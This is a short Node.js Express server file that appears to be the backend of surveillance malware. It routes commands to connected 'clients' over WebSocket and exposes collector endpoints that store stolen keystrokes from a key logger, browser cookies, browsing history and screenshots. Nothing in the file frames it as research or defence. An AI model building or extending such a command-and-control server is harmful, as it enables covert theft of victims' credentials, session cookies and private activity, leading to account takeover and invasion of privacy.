import express from 'express';
import cors from 'cors';
import http from 'http';
import ws_server, {CLIENTS} from "./ws_server.js";
import 'dotenv/config';
import * as fs from 'node:fs'
import collectorController from "./controllers/collector_controller.js";
import clientController from "./controllers/client_controller.js";
import {S3Client} from "@aws-sdk/client-s3";

export const s3Client = new S3Client({region: process.env.AWS_S3_REGION});

const app = express();

// Middleware to disable cors
app.use(cors())
// Middleware to parse JSON bodies
app.use(express.json({limit: '200mb'}));

// Client routes
app.get('/clients', clientController.index)
app.post(`/clients/send-command`, clientController.sendCommand)

// Collector routes
app.get('/collector/screenshots', collectorController.listScreenshots)
app.post('/collector/key-logger', collectorController.saveKeys);
app.post('/collector/cookies', collectorController.saveCookies)
app.post('/collector/history', collectorController.saveHistory)
app.post('/collector/screenshot', collectorController.saveScreenshot)

export const http_server = http.createServer(app);
